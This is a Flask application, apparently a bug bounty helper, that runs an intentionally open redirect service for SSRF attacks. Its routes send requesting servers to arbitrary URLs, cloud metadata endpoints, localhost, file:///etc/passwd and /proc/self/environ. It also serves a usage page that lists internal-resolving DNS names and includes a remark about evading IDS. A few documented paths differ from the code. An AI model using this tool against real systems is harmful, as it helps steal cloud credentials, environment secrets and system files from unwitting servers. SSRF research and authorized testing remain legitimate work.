from flask import Flask, redirect, request, Response
import os

app = Flask(__name__)

@app.route("/redirect", methods=['GET', 'POST'])
def handle_redirect():
    url = request.args.get('url', 'https://example.com')
    try:
        redirect_type = int(request.args.get('type', 301))
    except (ValueError, TypeError):
        redirect_type = 301
    return redirect(url, code=redirect_type)

@app.route("/<int:nid>", methods=['GET', 'POST'])
def handle_nid(nid):
    url = request.args.get('url', 'https://example.com')
    return redirect(url, code=nid)

@app.route("/metadata", methods=['GET', 'POST'])
def handle_metadata():
    return redirect("http://169.254.169.254/latest/meta-data/", code=301)

@app.route("/metadata6", methods=['GET', 'POST'])
def handle_metadata6():
    return redirect("http://[fd00:ec2::254]/latest/meta-data/", code=301)

@app.route("/zeroes", methods=['GET', 'POST'])
def handle_zeroes():
    return redirect("http://0.0.0.0/", code=301)

@app.route("/localhost", methods=['GET', 'POST'])
def handle_localhost():
    return redirect("http://127.0.0.1/", code=301)

@app.route("/passwd", methods=['GET', 'POST'])
def handle_passwd():
    return redirect("file:///etc/passwd", code=301)

@app.route("/services", methods=['GET', 'POST'])
def handle_services():
    return redirect("file:///etc/services", code=301)

@app.route("/environ", methods=['GET', 'POST'])
def handle_environ():
    return redirect("file:///proc/self/environ", code=301)

@app.route("/", methods=['GET', 'POST'])
def docs():
    hostname = request.host
    html_content = f"""
    <html>
        <head>
            <title>301.bbh.qzz.io: the intentionally open redirect</title>
        </head>
        <body>
            <h3>301.bbh.qzz.io: the intentionally open redirect</h3>
            Example usage:
            <ul>
                <li>/redirect?url=https://example.com&type=302</li>
                <li>/{{301,302,303,307,308}}?url=http://example.com</li>
                <li>/metadata: shortcut for /redirect?url=http://169.254.169.254/latest/meta-data/</li>
                <li>/metadata6: shortcut for /redirct?url=http://[fd00:ec2::254]/latest/meta-data/</li>
                <li>/localhost: shortcut for /redirect?url=http://127.0.0.1</li>
                <li>/zeroes: shortcut for /redirct?url=http://0.0.0.0</li>
                <li>/passwd: shortcut for /redirect?url=file:////etc/passwd</li>
                <li>/services: shortcut for /redirct?url=file:///etc/services (avoid IDS maybe...)</li>
                <li>/environ: shortcut for /redirect?url=file:///self/proc/environ</li>
            </ul>
            <p>
                Bonus DNS records!
                <ul>
                    <li>localhost.bbh.qzz.io: 127.0.0.1</li>
                    <li>metadata.bbh.qzz.io: 169.254.169.254</li>
                    <li>ipv6.metadata.bbh.qzz.io: [::169.254.169.254]</li>
                </ul>
            </p>
        </body>
    </html>
    """
    return html_content
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)
